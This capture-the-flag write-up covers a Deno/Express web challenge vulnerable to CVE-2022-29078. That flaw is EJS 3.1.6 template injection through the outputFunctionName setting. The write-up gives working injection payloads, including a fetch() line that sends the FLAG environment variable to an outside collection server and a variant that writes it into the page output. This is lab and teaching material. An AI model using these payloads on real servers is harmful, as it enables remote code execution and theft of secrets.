## Solve Process  
We are greeted with this page  
![image58](/static/writeups/photos/image58.png)  
You input a duck name, and get info on it  
![image59](/static/writeups/photos/image59.png)

Nothing special here. Lets look at the source code. 

We also can see where the flag is located in the server, inside the environment variables  
```javascript
if (!Deno.env.has('FLAG')) {
  throw new Error('flag is not configured')
}
```
The hint told us that the website hasn’t been updated. This usually clues us into a CVE attack, usually because the modules are outdated.  
```javascript
import express from 'npm:express@4.18.2'
import 'npm:ejs@3.1.6'
```
Checking the versions of each module, we can google for common CVE’s on any CVE website. I use [this](https://www.cvedetails.com/vulnerability-list/vendor\_id-21510/EJS.html?page=1\&order=1\&trc=6\&sha=6e24efd2739829041c99beb25ded6dfd67d57e85)

Notable, EJS version 3.1.6 seems to have a major CVE, **CVE-2022-29078**, which allows for an RCE attack.   
[This](https://eslam.io/posts/ejs-server-side-template-injection-rce/) writeup provides a good explanation of how the CVE works. Basically, if the server is allows the user to have their own attributes in the “data” parameter of the render method in ejs, then their server will be exposed to an RCE. In this case, that is true.  
```javascript
app.post('/', (req, res) => {
  for (const [breed, summary] of Object.entries(breeds)) {
    if (req.body?.breed?.toLowerCase() === breed.toLowerCase()) {
      res.render('search', {
        summary,
        notFound: false,
        ...req.body
      })
    }
    return
  }
})
```
The attributes in req.body are parsed into the data parameter of the render method in ejs. This allows the user to conduct the RCE by change the **settings\[view options\]\[outputFunctionName\]** value which can then execute arbitrary code. 

For example, if the attacker sets   
```javascript 
settings[view options][outputFunctionName]=x;console.log('hello');s
```  
Then the console.log(‘hello’) will be executed by the ejs parser.

## Trying payloads  
At first, tried a simple fetch request to try to exfiltrate the code:  
```javascript 
settings[view options][outputFunctionName]=x;fetch('myserver?'+Deno.env.get('FLAG'));s
```
I used [requestBin](https://pipedream.com) to exflitrate the data. However, it seems the request did not go through. This could be because the network restricts external requests.

Then, I tried digging deeper into how EJS works to see if I can get the webpage to display the flag instead.  
```javascript
prepended += 
  ' var __output = "";\n' + 
  ' function __append(s) { if (s !== undefined && s !== null) __output += s }\n';

if (opts.outputFunctionName) {
  prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```
This is also where the exploit happens. **opts.outputFunctionName** is where our payload is.   
Right above that, we see a **\_\_output**. Judging by the name, I assumed that this is probably the request response that is outputted by EJS. As such, if I add the Flag to this output, I should see the flag in the webpage.  
```javascript
settings[view options][outputFunctionName]=x;__output+=Deno.env.get('FLAG');s
```

Using Burpsuite:  
![image64](/static/writeups/photos/image64.png)

And we get our flag:  
![image65](/static/writeups/photos/image65.png)
